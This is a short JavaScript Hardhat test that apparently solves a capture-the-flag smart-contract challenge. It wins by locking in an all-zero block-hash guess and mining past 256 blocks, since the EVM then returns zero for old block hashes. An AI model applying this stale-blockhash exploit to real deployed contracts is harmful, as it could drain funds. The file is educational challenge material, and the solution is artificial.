const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { fixtureFactory } = require("../utils");

it("Solves PredictTheBlockHashChallenge", async function () {
  const fixture = () => fixtureFactory("PredictTheBlockHashChallenge", ethers.parseEther("1.0"));
  const contract = await loadFixture(fixture);

  const guess = "0x" + "0".repeat(64);
  await contract.lockInGuess(guess, {
    value: ethers.parseEther("1.0")
  });

  // EVM only saves most recent 256 blockhashes, and returns 0 for older ones.
  const provider = ethers.provider;
  while (await provider.getBlockNumber() < 300) {
    // Manually mine new blocks.
    await provider.send("evm_mine");
  }

  await contract.settle();
  expect(await contract.isComplete()).to.equal(true);
});
